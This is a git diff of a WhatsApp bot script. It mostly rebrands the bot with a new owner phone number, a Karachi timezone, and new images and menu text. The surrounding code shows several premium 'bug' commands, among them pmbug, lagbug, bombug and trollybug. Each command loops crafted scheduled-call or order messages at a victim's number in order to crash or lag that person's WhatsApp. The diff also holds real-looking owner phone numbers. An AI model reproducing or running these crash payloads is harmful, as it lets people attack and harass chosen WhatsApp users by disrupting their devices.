@@ -46,9 +46,9 @@ const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
 const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))
 
 //time
-const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
-        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
-        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
+const xtime = moment.tz('Asia/Karachi').format('HH:mm:ss')
+        const xdate = moment.tz('Asia/Karachi').format('DD/MM/YYYY')
+        const time2 = moment().tz('Asia/Karachi').format('HH:mm:ss')  
          if(time2 < "23:59:00"){
 var xeonytimewisher = `Good Night 🌌`
  }
@@ -148,7 +148,7 @@ var xeonlod = [
 "《 ███████▒▒▒▒▒》50%",
 "《 ██████████▒▒》80%",
 "《 ████████████》100%",
-"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 K A M I bug BOT 🦄..."
+"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ..."
 ]
 let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
@@ -190,7 +190,7 @@ await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
         }
         
         if (autobio) {
-            XeonBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
+            XeonBotInc.updateProfileStatus(`TRUST ME I'M MORE THEN WHAT YOU THINK`).catch(_ => _)
         }
         if (m.sender.startsWith('92') && global.anti92 === true) {
             return XeonBotInc.updateBlockStatus(m.sender, 'block')
@@ -578,7 +578,7 @@ senddocu(buffer)
                                 showAdAttribution: true,
                                 title: 'Broadcast By Owner',
                                 body: `Sent ${i.length} Group`,
-                                thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
+                                thumbnailUrl: 'https://i.imgur.com/rmCgpTY.jpg',
                                 sourceUrl: global.link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -886,7 +886,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${latensi.toFixed(4)} Second`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            thumbnailUrl: 'https://i.imgur.com/rmCgpTY.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -908,7 +908,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${ownername}`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            thumbnailUrl: 'https://i.imgur.com/rmCgpTY.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -928,7 +928,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `FORGET DONATE`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            thumbnailUrl: 'https://i.imgur.com/rmCgpTY.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -942,13 +942,13 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'script':
             case 'scriptbot':
                 XeonBotInc.sendMessage(m.chat, {
-                    text: `*Script:* https://youtu.be/Geo3tWsceVI`,
+                    text: `*Script:* script 😒 wa.me923323963788`,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
                             title: `${botname}`,
-                            body: `SCRIPT OF ${botname} is on YouTube @DGXeon`,
-                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
+                            body: `SCRIPT OF ${botname} is on GITHUB @kamran522`,
+                            thumbnailUrl: 'https://i.imgur.com/rmCgpTY.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1279,7 +1279,7 @@ replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
 break
 case 'delowner':
                 if (!isCreator) return replygcxeon(mess.owner)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 923323963788`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
@@ -1757,7 +1757,7 @@ const xeonybug1 = `${xeontext1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1769,7 +1769,7 @@ replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 min
 break
 case 'pmbug' :{
  if (!isPremium) return replygcxeon(mess.prem)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 923323963788`)
  await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -1778,7 +1778,7 @@ const xeonybug1 = `${xeontext1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1790,7 +1790,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'delaybug' : {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 923323963788`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -1799,7 +1799,7 @@ const xeonybug1 = xeontext2
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1811,9 +1811,9 @@ replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'docubug': {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 923323963788`)
 await loading()
-if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 923323963788`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
 for (let i = 0; i < amount; i++) {
@@ -1821,7 +1821,7 @@ const xeonybug1 = `${xeontext1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1833,7 +1833,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'unlimitedbug' : {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 923323963788`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -1842,7 +1842,7 @@ const xeonybug1 = xeontext3
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1854,7 +1854,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'bombug': {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 923323963788`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -1863,7 +1863,7 @@ const xeonybug1 = xeontext4
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1875,7 +1875,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'lagbug' : {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 923323963788`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "30"
@@ -1884,7 +1884,7 @@ const xeonybug1 = xeontext2
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1896,7 +1896,7 @@ replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 case 'trollybug': {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 923323963788`)
 await loading()
 victim = text.split("|")[0]+'@s.whatsapp.net'
 amount = "15"
@@ -1910,7 +1910,7 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${botname}`,
 "orderTitle": " TROLLY BUG ", 
-"sellerJid": "916909137213@s.whatsapp.net",
+"sellerJid": "923323963788@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
@@ -1931,7 +1931,7 @@ const xeonybug1 = `${xeontext1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1953,7 +1953,7 @@ const xeonybug1 = xeontext5
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1975,7 +1975,7 @@ const xeonybug1 = xeontext2
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -1997,7 +1997,7 @@ const xeonybug1 = xeontext4
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -2019,7 +2019,7 @@ const xeonybug1 = xeontext3
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -2046,7 +2046,7 @@ var order = generateWAMessageFromContent(from, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${botname}`,
 "orderTitle": " TROLLY BUG ", 
-"sellerJid": "916909137213@s.whatsapp.net",
+"sellerJid": "923323963788@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: from, quoted:m})
@@ -2067,7 +2067,7 @@ const xeonybug1 = `${xeontext1}`
 var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage": {
 "callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Karachi").format("DD/MM/YYYY HH:mm:ss")}`,
 "title": xeonybug1,
 }
 }), { userJid: from, quoted : m})
@@ -2082,8 +2082,8 @@ break
             case 'alive':
             case '?':
                 let mono = '```'
-                let xeonmenuoh = `${mono}A.SALAM.A ${pushname}
-╰┈➤ ${xeonytimewisher} _THIS IS SIMPLE BOT BY KAMRAN . USE FOR ONLY GOOD PURPOSE_ 😄
+                let xeonmenuoh = `${mono}Hello ${pushname}
+╰┈➤ ${xeonytimewisher} 😄
 ${readmore}
 ╰┈➤ʙᴜɢ ᴍᴇɴᴜ
 amountbug <amount>
@@ -2166,6 +2166,7 @@ fliptext
 emojimix
 
 ╰┈➤ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ
+addprem
 addvideo
 addimage
 addsticker
@@ -2173,6 +2174,7 @@ addvn
 addzip
 addapk
 addpdf
+delprem
 delvideo
 delimage
 delsticker
@@ -2180,6 +2182,7 @@ delvn
 delzip
 delapk
 delpdf
+listprem
 listvideo
 listimage
 liststicker
